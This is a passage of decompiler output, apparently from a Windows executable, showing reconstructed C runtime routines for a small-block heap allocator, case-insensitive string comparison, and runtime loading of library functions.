	struct Eq_10833 * edx_22 = (word32) dwArg08 - 0x04;
	Eq_10835 esi_136 = esi_20 >> 0x0F;
	int32 edi_28 = *(dwArg08 - 0x08);
	int32 ebx_293 = ebx_21 - 0x01;
	word32 * ecx_32 = (word32) eax_18 + ((esi_20 >> 0x0F) *s 0x0204 + 0x0144);
	int32 dwLoc10_33 = ebx_21 - 0x01;
	dwArg08_349 = dwArg08;
	if (((byte) ecx_35 & 0x01) == 0x00)
	{
		Eq_5944 ecx_439 = (ecx_35 >> 0x04) - 0x01;
		dwArg08_349 = ecx_439;
		if (ecx_439 > 0x3F)
			dwArg08_349.u0 = 0x3F;
		if (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04) == (ebx_21 + 0x07) + ((word32) dwArg08 - 0x04))
		{
			byte cl_463 = (byte) dwArg08_349;
			if (dwArg08_349 < 0x20)
			{
				uint32 edi_469 = ~(0x80000000 >> cl_463);
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edi_469;
				word32 ecx_468 = dwArg08_349 + 0x04 + eax_18;
				Eq_10970 v17_474 = *ecx_468 - 0x01;
				*ecx_468 = v17_474;
				if (v17_474 == 0x00)
					*dwArg04 = *dwArg04 & edi_469;
			}
			else
			{
				word32 edi_489 = ~(0x80000000 >>u (byte) (dwArg08_349 + ~0x1F));
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edi_489;
				word32 ecx_488 = dwArg08_349 + 0x04 + eax_18;
				Eq_10970 v20_494 = *ecx_488 - 0x01;
				*ecx_488 = v20_494;
				if (v20_494 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edi_489;
			}
		}
		*((char *) (ebx_21 + 0x07 + ((word32) dwArg08 - 0x04)) + 0x04) = ebx_21 + 0x03 + ((word32) dwArg08 - 0x04);
		*((char *) (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04)) + 0x08) = ebx_21 + 0x07 + ((word32) dwArg08 - 0x04);
		ebx_293 = ebx_21 - 0x01 + ecx_35;
		dwLoc10_33 = ebx_293;
	}
	Eq_10860 edi_53 = ebx_293 >> 0x04;
	Eq_5944 edi_357 = edi_53 - 0x01;
	if (edi_53 > 0x40)
		edi_357.u0 = 0x3F;
	if ((edi_28 & 0x01) == 0x00)
	{
		Eq_5944 ecx_343 = (edi_28 >> 0x04) - 0x01;
		struct Eq_10833 * edx_337 = (word32) dwArg08 - 0x04 - edi_28;
		dwArg08_349 = ecx_343;
		if (ecx_343 > 0x3F)
		{
			dwArg08_349.u0 = 0x3F;
			ecx_343.u0 = 0x3F;
		}
		ebx_293 = ebx_293 + edi_28;
		dwLoc10_33 = ebx_293;
		edi_357 = (ebx_293 >> 0x04) - 0x01;
		if (edi_357 > 0x3F)
			edi_357.u0 = 0x3F;
		if (ecx_343 != edi_357)
		{
			if (edx_337->ptr0004 == edx_337->ptr0008)
			{
				byte cl_388 = (byte) dwArg08_349;
				if (dwArg08_349 < 0x20)
				{
					uint32 edx_394 = ~(0x80000000 >> cl_388);
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edx_394;
					word32 ecx_393 = dwArg08_349 + 0x04 + eax_18;
					Eq_10970 v23_399 = *ecx_393 - 0x01;
					*ecx_393 = v23_399;
					if (v23_399 == 0x00)
						*dwArg04 = *dwArg04 & edx_394;
				}
				else
				{
					word32 edx_414 = ~(0x80000000 >>u (byte) (dwArg08_349 + ~0x1F));
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edx_414;
					word32 ecx_413 = dwArg08_349 + 0x04 + eax_18;
					Eq_10970 v26_419 = *ecx_413 - 0x01;
					*ecx_413 = v26_419;
					if (v26_419 == 0x00)
						*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edx_414;
				}
			}
			edx_337->ptr0008->ptr0004 = edx_337->ptr0004;
			edx_337->ptr0004->ptr0008 = edx_337->ptr0008;
		}
		edx_22 = edx_337;
	}
	if ((edi_28 & 0x01) != 0x00 || dwArg08_349 != edi_357)
	{
		edx_22->ptr0004 = (ecx_32 + edi_357 * 0x08)[0x01];
		struct Eq_10833 * ecx_269 = ecx_32 + edi_357 * 0x08;
		edx_22->ptr0008 = ecx_269;
		ecx_269->ptr0004 = edx_22;
		edx_22->ptr0004->ptr0008 = edx_22;
		if (edx_22->ptr0004 == edx_22->ptr0008)
		{
			byte cl_278 = Mem273[edi_357 + 0x04 + eax_18:byte];
			Mem284[edi_357 + 0x04 + eax_18:byte] = cl_278 + 0x01;
			if (edi_357 < 0x20)
			{
				if (cl_278 == 0x00)
					*dwArg04 = *dwArg04 | 0x80000000 >> (byte) edi_357;
				word32 eax_300 = eax_18 + 0x44 + (esi_20 >>u 0x0F) * 0x04;
				*eax_300 = *eax_300 | 0x80000000 >> (byte) edi_357;
			}
			else
			{
				if (cl_278 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) | 0x80000000 >> (byte) (edi_357 - (union Eq_10970 *) 0x20);
				word32 eax_321 = eax_18 + 0xC4 + (esi_20 >>u 0x0F) * 0x04;
				*eax_321 = *eax_321 | 0x80000000 >> (byte) (edi_357 - (union Eq_10970 *) 0x20);
			}
			ebx_293 = dwLoc10_33;
		}
	}
	*edx_22 = ebx_293;
	edx_22[(ebx_293 - 0x04) / 0x0C] = (struct Eq_10833) ebx_293;
	word32 v31_91 = *ecx_32 - 0x01;
	*ecx_32 = v31_91;
	if (v31_91 != 0x00)
		return;
	Eq_261 eax_132;
	Eq_261 eax_119 = globals->t492070;
	if (eax_119 != 0x00)
	{
		VirtualFree((word32) *((word32) eax_119 + 0x0C) + (globals->t492068 << 0x0F), 0x8000, 0x4000);
		Eq_261 eax_171 = globals->t492070;
		*((word32) eax_171 + 0x08) = *((word32) eax_171 + 0x08) | 0x80000000 >> (byte) globals->t492068;
		Eq_10835 ecx_178 = globals->t492068;
		Eq_10822 eax_179 = *((word32) globals->t492070 + 0x0010);
		*((word32) eax_179 + (ecx_178 * 0x04 + 0x00C4)) = *((word32) eax_179 + (ecx_178 * 0x04 + 0x00C4)) & 0x00;
		Eq_10822 eax_184 = *((word32) globals->t492070 + 0x0010);
		*((word32) eax_184 + 0x0043) = *((word32) eax_184 + 0x0043) - 0x01;
		Eq_261 eax_187 = globals->t492070;
		if (*((word32) *((word32) eax_187 + 0x0010) + 0x0043) == 0x00)
		{
			*((word32) eax_187 + 0x04) = *((word32) eax_187 + 0x04) & ~0x01;
			eax_187 = globals->t492070;
		}
		if (*((word32) eax_187 + 0x08) == ~0x00)
		{
			VirtualFree(esp_201->t0000, esp_201->t0004, esp_201->t0008);
			*(esp_203 - 0x04) = (union Eq_10822 *) *((word32) globals->t492070 + 0x0010);
			*(esp_203 - 0x08) = 0x00;
			*(esp_203 - 0x0C) = (HANDLE *) globals->t493084;
			HeapFree(*(esp_203 - 0x0C), *(esp_203 - 0x08), *(esp_203 - 0x04));
			Eq_261 eax_233 = globals->t492070;
			*(esp_203 - 0x04) = (word32) globals->t492078 + ((globals->dw492074 * 0x14 - eax_233) - 0x14);
			*(esp_203 - 0x08) = (word32) eax_233 + 0x0014;
			*(esp_203 - 0x0C) = (union Eq_261 *) eax_233;
			eax_132 = fn00407C00(dwArg00, dwArg04, dwArg08_349, out esi_136)->t0008;
			globals->dw492074 = globals->dw492074 - 0x01;
			if (eax_132 > globals->t492070)
				eax_132 = eax_132 - 0x14;
			globals->t49206C = globals->t492078;
l0040B519:
			globals->t492070 = eax_132;
			globals->t492068 = esi_136;
			return;
		}
	}
	eax_132 = dwArg04;
	goto l0040B519;
}

// 0040B529: Register ptr32 fn0040B529(Register uint32 esi, Stack uint32 dwArg04, Stack byte bArg07)
ptr32 fn0040B529(uint32 esi, uint32 dwArg04, byte bArg07)
{
	uint32 esi_355;
	uint32 dwLoc0C_33;
	uint32 dwLoc10_32;
	int32 ecx_25 = dwArg04 + 0x17 & ~0x0F;
	Eq_261 edx_9 = globals->t492078;
	int32 ecx_28 = (ecx_25 >> 0x04) - 0x01;
	Eq_261 edi_20 = (word32) edx_9 + (globals->dw492074 * 0x05) * 0x04;
	byte cl_29 = (byte) ecx_28;
	if (ecx_28 < 0x20)
	{
		esi_355 = (esi | ~0x00) >> cl_29;
		dwLoc0C_33 = dwLoc0C | ~0x00;
		dwLoc10_32 = esi_355;
	}
	else
	{
		esi_355 = 0x00;
		dwLoc10_32 = 0x00;
		dwLoc0C_33 = (dwArg04 | ~0x00) >> (byte) (ecx_28 + ~0x1F);
	}
	Eq_261 eax_38 = globals->t49206C;
	Eq_261 ebx_142 = eax_38;
	Eq_261 dwArg04_395 = eax_38;
	if (eax_38 < edi_20)
	{
		do
		{
			if ((*((word32) ebx_142 + 0x04) & dwLoc0C_33 | *ebx_142 & esi_355) != 0x00)
				goto l0040B5A0;
			ebx_142 = (word32) ebx_142 + 0x0014;
			dwArg04_395 = ebx_142;
		} while (ebx_142 < edi_20);
	}
l0040B5A0:
	ptr32 eax_162;
	if (ebx_142 == edi_20)
	{
		ebx_142 = edx_9;
		while (true)
		{
			bool Z_393 = cond(ebx_142 - eax_38);
			dwArg04_395 = ebx_142;
			if (ebx_142 >= eax_38)
				break;
			if ((*((word32) ebx_142 + 0x04) & dwLoc0C_33 | *ebx_142 & esi_355) != 0x00)
			{
				Z_393 = cond(ebx_142 - eax_38);
				break;
			}
			ebx_142 = (word32) ebx_142 + 0x0014;
		}
		if (!Z_393)
		{
			while (true)
			{
				bool Z_408 = cond(ebx_142 - edi_20);
				if (ebx_142 >= edi_20)
					break;
				if (*((word32) ebx_142 + 0x08) != 0x00)
				{
					Z_408 = cond(ebx_142 - edi_20);
					break;
				}
				ebx_142 = (word32) ebx_142 + 0x0014;
				dwArg04_395 = ebx_142;
			}
			if (!Z_408)
			{
				ebx_142 = (word32) edx_9 + 0x08;
				while (true)
				{
					bool Z_446 = cond(ebx_142 - eax_38);
					dwArg04_395 = ebx_142;
					if (ebx_142 >= eax_38)
						break;
					if (*ebx_142 != 0x00)
					{
						Z_446 = cond(ebx_142 - eax_38);
						break;
					}
					ebx_142 = (word32) ebx_142 + 0x0014;
				}
				if (!Z_446)
				{
					Eq_261 eax_454 = fn0040B832();
					ebx_142 = eax_454;
					dwArg04_395 = eax_454;
					if (eax_454 == 0x00)
					{
l0040B617:
						eax_162 = 0x00;
						return eax_162;
					}
				}
			}
			**((word32) ebx_142 + 0x0010) = fn0040B8E3(ebx_142);
			if (**((word32) ebx_142 + 0x0010) == ~0x00)
				goto l0040B617;
		}
	}
	globals->t49206C = ebx_142;
	struct Eq_11539 * eax_86 = *((word32) ebx_142 + 0x0010);
	Eq_10835 edx_363 = eax_86->t0000;
	Eq_10835 dwLoc08_347 = edx_363;
	if (edx_363 == ~0x00 || ((eax_86->a00C4)[edx_363] & dwLoc0C_33 | (eax_86->a0044)[edx_363] & esi_355) == 0x00)
	{
		dwLoc08_347 = edx_363 & 0x00;
		ui32 * ecx_349 = eax_86->a0044 + 33;
		esi_355 = dwLoc10_32;
		if ((eax_86->a00C4[0x00] & dwLoc0C_33 | (eax_86->a0044)[0x00] & dwLoc10_32) == 0x00)
		{
			do
			{
				ecx_349 = ecx_526 + 0x01;
				dwLoc08_347 = (word32) dwLoc08_347 + 0x01;
				ui32 * ecx_526 = ecx_349;
			} while ((*ecx_526 & dwLoc0C_33 | dwLoc10_32 & *ecx_349) == 0x00);
		}
		edx_363 = dwLoc08_347;
	}
	int32 edi_108 = 0x00;
	struct Eq_11604 * ecx_97 = eax_86 + (edx_363 *s 0x0204 + 0x0144) / 0x00C4;
	int32 ecx_100 = eax_86->a0044[edx_363] & esi_355;
	if (ecx_100 == 0x00)
	{
		ecx_100 = eax_86->a00C4[edx_363] & dwLoc0C_33;
		edi_108 = 0x20;
	}
	while (ecx_100 >= 0x00)
	{
		ecx_100 = ecx_100 << 0x01;
		edi_108 = edi_108 + 0x01;
	}
	struct Eq_11657 * edx_120 = ecx_97->a0004[edi_108].ptr0000;
	int32 ecx_122 = *edx_120 - ecx_25;
	int32 esi_127 = (ecx_122 >> 0x04) - 0x01;
	if (esi_127 > 0x3F)
		esi_127 = 0x3F;
	if (esi_127 == edi_108)
	{
l0040B7E0:
		if (ecx_122 != 0x00)
		{
			*edx_120 = ecx_122;
			edx_120[(ecx_122 - 0x04) / 0x0C] = (struct Eq_11657) ecx_122;
		}
		goto l0040B7EF;
	}
	if (edx_120->ptr0004 == edx_120->ptr0008)
	{
		if (edi_108 < 0x20)
		{
			uint32 ebx_290 = ~(0x80000000 >> (byte) edi_108);
			eax_86->a0044[dwLoc08_347] = ebx_290 & (eax_86->a0044)[dwLoc08_347];
			byte * edi_289 = (char *) &eax_86->t0000 + 0x04 + edi_108;
			byte v19_295 = *edi_289 - 0x01;
			*edi_289 = v19_295;
			if (v19_295 == 0x00)
			{
				*dwArg04_395 = *dwArg04_395 & ebx_290;
				ebx_142 = dwArg04_395;
				goto l0040B73C;
			}
l0040B739:
			ebx_142 = dwArg04_395;
			goto l0040B73C;
		}
		ui32 * ecx_311 = eax_86->a00C4 + dwLoc08_347;
		uint32 ebx_312 = ~(0x80000000 >> (byte) (edi_108 - 0x20));
		*ecx_311 = *ecx_311 & ebx_312;
		byte * edi_310 = (char *) &eax_86->t0000 + 0x04 + edi_108;
		byte v22_317 = *edi_310 - 0x01;
		*edi_310 = v22_317;
		if (v22_317 != 0x00)
			goto l0040B739;
		*((word32) dwArg04_395 + 0x04) = *((word32) dwArg04_395 + 0x04) & ebx_312;
		ebx_142 = dwArg04_395;
	}
l0040B73C:
	edx_120->ptr0008->ptr0004 = edx_120->ptr0004;
	edx_120->ptr0004->ptr0008 = edx_120->ptr0008;
	if (ecx_122 == 0x00)
	{
l0040B7EF:
		word32 * edx_145 = edx_120 + ecx_122 / 0x0C;
		*edx_145 = ecx_25 + 0x01;
		(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(edx_145 - 0x04)[ecx_25].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00] = ecx_25 + 0x01;
		word32 ecx_150 = ecx_97->dw0000;
		ecx_97->dw0000 = ecx_150 + 0x01;
		if (ecx_150 == 0x00 && (ebx_142 == globals->t492070 && dwLoc08_347 == globals->t492068))
			globals->t492070 = globals->t492070 & 0x00;
		eax_86->t0000 = dwLoc08_347;
		eax_162 = edx_145 + 0x01;
		return eax_162;
	}
	edx_120->ptr0004 = ecx_97->a0004[esi_127].ptr0000;
	struct Eq_11657 * ecx_205 = ecx_97 + esi_127 * 0x02;
	edx_120->ptr0008 = ecx_205;
	ecx_205->ptr0004 = edx_120;
	edx_120->ptr0004->ptr0008 = edx_120;
	if (edx_120->ptr0004 == edx_120->ptr0008)
	{
		byte cl_224 = eax_86[(esi_127 + 0x04) / 0x00C4];
		if (esi_127 < 0x20)
		{
			eax_86[(esi_127 + 0x04) / 0x00C4] = (struct Eq_11539) (cl_224 + 0x01);
			if (cl_224 == 0x00)
				*ebx_142 = *ebx_142 | 0x80000000 >> (byte) esi_127;
			eax_86->a0044[dwLoc08_347] = eax_86->a0044[dwLoc08_347] | 0x80000000 >> (byte) esi_127;
		}
		else
		{
			eax_86[(esi_127 + 0x04) / 0x00C4] = (struct Eq_11539) (cl_224 + 0x01);
			if (cl_224 == 0x00)
				*((word32) ebx_142 + 0x04) = *((word32) ebx_142 + 0x04) | 0x80000000 >> (byte) (esi_127 - 0x20);
			ui32 * edi_255 = eax_86->a00C4 + dwLoc08_347;
			*edi_255 = *edi_255 | 0x80000000 >> (byte) (esi_127 - 0x20);
		}
	}
	goto l0040B7E0;
}

// 0040B832: Register (ptr Eq_11986) fn0040B832()
Eq_11986 * fn0040B832()
{
	struct Eq_11986 * eax_22;
	ui32 eax_114 = globals->dw492074;
	ui32 ecx_4 = globals->dw492064;
	if (eax_114 == ecx_4)
	{
		Eq_261 eax_106 = HeapReAlloc(globals->t493084, 0x00, globals->t492078, ecx_4 + 0x50 + ecx_4 * 0x04 << 0x02);
		if (eax_106 == 0x00)
		{
l0040B8C5:
			eax_22 = null;
			return eax_22;
		}
		globals->dw492064 = globals->dw492064 + 0x10;
		globals->t492078 = eax_106;
		eax_114 = globals->dw492074;
	}
	struct Eq_11986 * esi_52 = (word32) globals->t492078 + (eax_114 * 0x05) * 0x04;
	Eq_261 eax_53 = HeapAlloc(globals->t493084, 0x08, 0x41C4);
	esi_52->t0010 = eax_53;
	if (eax_53 != 0x00)
	{
		Eq_261 eax_66 = VirtualAlloc(0x00, 0x00100000, 0x2000, 0x04);
		esi_52->t000C = eax_66;
		if (eax_66 != 0x00)
		{
			esi_52->dw0008 = esi_52->dw0008 | ~0x00;
			esi_52->dw0000 = 0x00;
			esi_52->dw0004 = 0x00;
			globals->dw492074 = globals->dw492074 + 0x01;
			Eq_261 eax_88 = esi_52->t0010;
			*eax_88 = *eax_88 | ~0x00;
			eax_22 = esi_52;
			return eax_22;
		}
		HeapFree(globals->t493084, 0x00, esi_52->t0010);
	}
	goto l0040B8C5;
}

// 0040B8E3: Register int32 fn0040B8E3(Stack Eq_261 dwArg04)
int32 fn0040B8E3(Eq_261 dwArg04)
{
	struct Eq_12106 * esi_22 = dwArg04->ptr0010;
	int32 eax_23 = dwArg04->dw0008;
	int32 ebx_25 = 0x00;
	while (eax_23 >= 0x00)
	{
		eax_23 = eax_23 << 0x01;
		ebx_25 = ebx_25 + 0x01;
	}
	word32 edx_46 = 0x3F;
	struct Eq_12119 * eax_48 = esi_22 + (ebx_25 *s 0x0204 + 0x0144) / 0x00C4;
	eax_52 = eax_48;
	do
	{
		struct Eq_12119 * eax_52;
		eax_52[0x01] = (struct Eq_12119) eax_52;
		eax_52->dw0004 = eax_52;
		eax_52 = eax_52 + 0x01;
		edx_46 = edx_46 - 0x01;
	} while (edx_46 != 0x00);
	int32 eax_141;
	Eq_261 edi_65 = (ebx_25 << 0x0F) + dwArg04->dw000C;
	Eq_261 eax_72 = VirtualAlloc(edi_65, 0x8000, 0x1000, 0x04);
	if (eax_72 == 0x00)
		eax_141 = eax_72 | ~0x00;
	else
	{
		if (edi_65 <=u edi_65 + 0x7000)
		{
			word32 eax_147 = edi_65 + 0x10;
			do
			{
				*(eax_147 - 0x08) = *(eax_147 - 0x08) | ~0x00;
				*((word32) eax_147 + 0x0FEC) = *((word32) eax_147 + 0x0FEC) | ~0x00;
				*(eax_147 - 0x04) = 0x0FF0;
				Mem158[eax_147 + 0x00:word32] = eax_147 + 0x0FFC;
				Mem160[eax_147 + 0x04:word32] = eax_147 + ~0x1003;
				*((word32) eax_147 + 0x0FE8) = 0x0FF0;
				eax_147 = eax_147 + 0x1000;
			} while (eax_147 - 0x10 <=u edi_65 + 0x7000);
		}
		Mem114[eax_48 + 0x01FC:word32] = edi_65 + 0x0C;
		*((word32) edi_65 + 0x0014) = eax_48 + 0x003F;
		Mem117[eax_48 + 0x0200:word32] = edi_65 + 0x700C;
		*((word32) edi_65 + 28688) = eax_48 + 0x003F;
		esi_22->a0044[ebx_25] = esi_22->a0044[ebx_25] & 0x00;
		esi_22->a00C4[ebx_25] = 0x01;
		byte al_123 = esi_22->b0043;
		esi_22->b0043 = al_123 + 0x01;
		if (al_123 == 0x00)
			dwArg04->dw0004 = dwArg04->dw0004 | 0x01;
		dwArg04->dw0008 = dwArg04->dw0008 & ~(0x80000000 >> (byte) ebx_25);
		eax_141 = ebx_25;
	}
	return eax_141;
}

// 0040B9DE: Register word32 fn0040B9DE(Stack word32 dwArg04)
word32 fn0040B9DE(word32 dwArg04)
{
	<anonymous> * eax_3 = globals->ptr492054;
	if (eax_3 != null)
	{
		word32 * esp_27;
		word32 eax_28;
		byte SZO_29;
		byte C_30;
		byte Z_31;
		word32 ecx_32;
		eax_3();
		if (eax_28 != 0x00)
		{
			*esp_27 = 0x01;
			return *esp_27;
		}
	}
	return 0x00;
}

// 0040BC76: Register word32 fn0040BC76(Stack word32 dwArg04)
word32 fn0040BC76(word32 dwArg04)
{
	return fn0040BC87((byte) dwArg04, 0x00, 0x04);
}

// 0040BC87: Register ui32 fn0040BC87(Stack byte bArg04, Stack word32 dwArg08, Stack byte bArg0C)
ui32 fn0040BC87(byte bArg04, word32 dwArg08, byte bArg0C)
{
	struct Eq_12315 * eax_3 = (word32) bArg04;
	if ((eax_3->b4932E1 & bArg0C) == 0x00)
	{
		ui32 eax_29;
		if (dwArg08 != 0x00)
			eax_29 = (word32) globals->a4111BA[eax_3 * 0x02] & dwArg08;
		else
			eax_29 = 0x00;
		if (eax_29 == 0x00)
			return eax_29;
	}
	return 0x01;
}

// 0040BCB8: Register word32 fn0040BCB8()
word32 fn0040BCB8()
{
	struct Eq_12340 * esp_103;
	word32 ebx_41 = 0x00;
	if (globals->t492058 != 0x00)
	{
l0040BD07:
		struct Eq_12347 * esp_36 = fp - 0x0C;
		Eq_15 eax_37 = globals->t49205C;
		if (eax_37 != 0x00)
		{
			word32 ebx_64;
			byte SZO_65;
			byte C_66;
			byte SCZO_67;
			word32 esi_68;
			word32 edi_69;
			byte Z_70;
			word32 eax_71;
			eax_37();
			ebx_41 = eax_71;
			if (eax_71 != 0x00)
			{
				Eq_15 eax_76 = globals->t492060;
				if (eax_76 != 0x00)
				{
					*(esp_36 - 0x04) = eax_71;
					word32 ebx_83;
					byte SZO_84;
					byte C_85;
					byte SCZO_86;
					word32 esi_87;
					word32 edi_88;
					byte Z_89;
					word32 eax_90;
					eax_76();
					ebx_41 = eax_90;
				}
			}
		}
		struct Eq_12382 * esp_44 = esp_36 - 0x04;
		esp_44->dw0000 = esp_36->dw0018;
		*(esp_44 - 0x04) = esp_44->dw0018;
		*(esp_44 - 0x08) = esp_44->dw0014;
		*(esp_44 - 0x0C) = ebx_41;
		word32 ebx_55;
		byte SZO_56;
		byte C_57;
		byte SCZO_58;
		word32 esi_59;
		word32 edi_60;
		byte Z_61;
		word32 eax_62;
		globals->t492058();
		return esp_103->dw0008;
	}
	else
	{
		Eq_34 eax_94 = LoadLibraryA(0x0040D60C);
		if (eax_94 != null)
		{
			Eq_15 eax_112 = GetProcAddress(eax_94, 0x0040D600);
			globals->t492058 = eax_112;
			if (eax_112 != 0x00)
			{
				globals->t49205C = GetProcAddress(eax_94, 0x0040D5F0);
				globals->t492060 = GetProcAddress(eax_94, 0x0040D5DC);
				goto l0040BD07;
			}
		}
		esp_103 = fp - 0x0C;
		return esp_103->dw0008;
	}
}

// 0040C490: Register Eq_11 fn0040C490(Register byte dl, Register byte bl, Stack Eq_11 dwArg04, Stack word32 dwArg08, Stack Eq_15 dwArg0C, Register out Eq_454 dlOut, Register out Eq_455 blOut)
Eq_11 fn0040C490(byte dl, byte bl, Eq_11 dwArg04, word32 dwArg08, Eq_15 dwArg0C, Eq_454 & dlOut, Eq_455 & blOut)
{
	*dlOut = dl;
	Eq_11 ecx_100 = dwArg0C;
	if (dwArg0C != 0x00)
	{
		byte * esi_119 = dwArg04;
		byte * edi_120 = dwArg08;
		if (globals->t491ED4 == 0x00)
		{
			Eq_11 ecx_135 = dwArg0C;
l0040C4BC:
			bool C_110;
			cu8 ah_82 = *esi_119;
			cu8 ah_104 = ah_82;
			cu8 al_105 = *edi_120;
			if (ah_82 != 0x00 && al_105 != 0x00)
			{
				esi_119 = esi_119 + 0x01;
				edi_120 = edi_120 + 0x01;
				if (ah_82 >= 0x41 && ah_82 <= 0x5A)
					ah_104 = ah_82 + 0x20;
				if (al_105 >= 0x41 && al_105 <= 0x5A)
					al_105 = al_105 + 0x20;
				C_110 = cond(ah_104 - al_105);
				if (ah_104 != al_105)
					goto l0040C4EB;
				ecx_135 = ecx_135 - 0x01;
				if (ecx_135 != 0x00)
					goto l0040C4BC;
			}
			ecx_100.u0 = 0x00;
			C_110 = cond(ah_104 - al_105);
			if (ah_104 != al_105)
			{
l0040C4EB:
				ecx_100.u0 = ~0x00;
				if (!C_110)
					ecx_100 = -~0x00;
			}
		}
		else
		{
			Eq_5606 eax_148 = 0x00;
			Eq_5606 ebx_149 = 0x00;
			byte * edi_152 = dwArg08;
l0040C4FC:
			bool C_193;
			Eq_5606 eax_171 = DPB(eax_148, *esi_119, 0);
			eax_148 = eax_171;
			ebx_149 = DPB(ebx_149, *edi_152, 0);
			if (eax_171 != 0x00 && ebx_149 != 0x00)
			{
				Eq_11 ecx_248;
				byte dl_249;
				Eq_5606 eax_250 = fn004076EE(ecx_100, ebx_149, SLICE(ebx_149, byte, 8), SLICE(ebx_149, byte, 16), out ecx_248, out dl_249);
				word32 ecx_256;
				byte dl_257;
				eax_148 = fn004076EE(ecx_248, eax_171, SLICE(eax_171, byte, 8), SLICE(eax_171, byte, 16), out ecx_256, out dl_257);
				esi_119 = esi_119 + 0x01;
				edi_152 = edi_152 + 0x01;
				ebx_149 = eax_250;
				C_193 = cond(eax_148 - eax_250);
				if (eax_148 != eax_250)
					goto l0040C52D;
				ecx_100 = ecx_100 - 0x01;
				if (ecx_100 != 0x00)
					goto l0040C4FC;
			}
			ecx_100.u0 = 0x00;
			C_193 = cond(eax_148 - ebx_149);
			if (eax_148 != ebx_149)
			{
l0040C52D:
				ecx_100.u0 = ~0x00;
				if (!C_193)
					ecx_100 = -~0x00;
			}
		}
	}
	byte bl_53;
	*blOut = (byte) ebx;
	return ecx_100;
}

// 0040C540: Register int32 fn0040C540(Register Eq_11 ecx, Stack Eq_11 dwArg04, Stack ptr32 dwArg08)
int32 fn0040C540(Eq_11 ecx, Eq_11 dwArg04, ptr32 dwArg08)
{
	int32 eax_143;
	byte * esi_139 = dwArg08;
	if (globals->t491ED4 == 0x00)
	{
		cu8 al_108 = ~0x00;
		byte * edi_50 = dwArg04;
		do
		{
			cu8 al_117 = al_108;
			if (al_108 == 0x00)
				goto l0040C58E;
			al_108 = *esi_139;
			esi_139 = esi_139 + 0x01;
			cu8 ah_87 = *edi_50;
			edi_50 = edi_50 + 0x01;
			if (ah_87 == al_108)
				continue;
			cu8 al_107 = ah_87 - 0x41 + (0x00 - (ah_87 < 0x5B) & 0x20);
			cu8 al_97 = al_108 - 0x41 + (0x00 - (al_108 < 0x5B) & 0x20);
			al_108 = al_107 + 0x41;
		} while (al_107 + 0x41 == al_97 + 0x41);
		cu8 al_114 = 0x00 - (al_107 + 0x41 < al_97 + 0x41);
		al_117 = al_114 - ~0x00 - (al_114 < 0x00);
l0040C58E:
		eax_143 = (int32) al_117;
	}
	else
	{
		Eq_5606 eax_120 = 0xFF;
		cu8 al_121 = ~0x00;
		Eq_5606 ebx_122 = 0x00;
		byte * edi_125 = dwArg04;
		do
		{
			eax_143 = (int32) DPB(eax_120, al_121, 0);
			if (al_121 == 0x00)
				return eax_143;
			al_121 = *esi_139;
			cu8 bl_150 = *edi_125;
			eax_120 = DPB(eax_120, al_121, 0);
			esi_139 = esi_139 + 0x01;
			ebx_122 = DPB(ebx_122, bl_150, 0);
			edi_125 = edi_125 + 0x01;
			if (al_121 == bl_150)
				continue;
			Eq_11 ecx_163;
			byte dl_164;
			Eq_5606 eax_165 = fn004076EE(ecx, ebx_122, SLICE(ebx_122, byte, 8), SLICE(ebx_122, byte, 16), out ecx_163, out dl_164);
			byte dl_171;
			eax_120 = fn004076EE(ecx_163, eax_120, SLICE(eax_120, byte, 8), SLICE(eax_120, byte, 16), out ecx, out dl_171);
			ebx_122 = eax_165;
			cu8 bl_167 = (byte) eax_165;
			al_121 = (byte) eax_120;
		} while (bl_167 == al_121);
		uint32 eax_179 = 0x00 - (bl_167 < al_121);
		eax_143 = eax_179 - ~0x00 - (eax_179 < 0x00);
	}
	return eax_143;
}

// 0040C5CC: void fn0040C5CC(Register ptr32 ebp, Stack Eq_11 dwArg04)
void fn0040C5CC(ptr32 ebp, Eq_11 dwArg04)
{
	Eq_11 eax_10 = globals->t491ED4;
	Eq_11 dwLoc08_123 = 0x00;
	if (eax_10 == 0x00)
	{
		byte * edx_51 = dwArg04;
		if (*dwArg04 != 0x00)
		{
			do
			{
				ci8 cl_77 = *edx_51;
				if (cl_77 >= 0x41 && cl_77 <= 0x5A)
					*edx_51 = cl_77 + 0x20;
				edx_51 = edx_51 + 0x01;
			} while (*edx_51 != 0x00);
		}
	}
	else
	{
		word32 ecx_115;
		byte dl_116;
		Eq_11 eax_117 = fn00408621(fp - 0x04, eax_10, (byte *) 0x0100, 0x01, dwArg04, ~0x00, 0x00, 0x00, 0x00, 0x01, out ecx_115, out dl_116);
		if (eax_117 != 0x00)
		{
			Eq_11 eax_147 = fn00409233(eax_117);
			dwLoc08_123 = eax_147;
			if (eax_147 != 0x00)
			{
				*(fp - 0x18) = 0x01;
				*(fp - 0x1C) = 0x00;
				*(fp - 0x20) = (union Eq_11 *) eax_117;
				*(fp - 0x24) = (union Eq_11 *) eax_147;
				*(fp - 0x28) = ~0x00;
				*(fp - 44) = (byte **) dwArg04;
				*(fp - 0x30) = 0x0100;
				*(fp - 0x34) = (union Eq_11 *) globals->t491ED4;
				word32 ecx_178;
				byte dl_179;
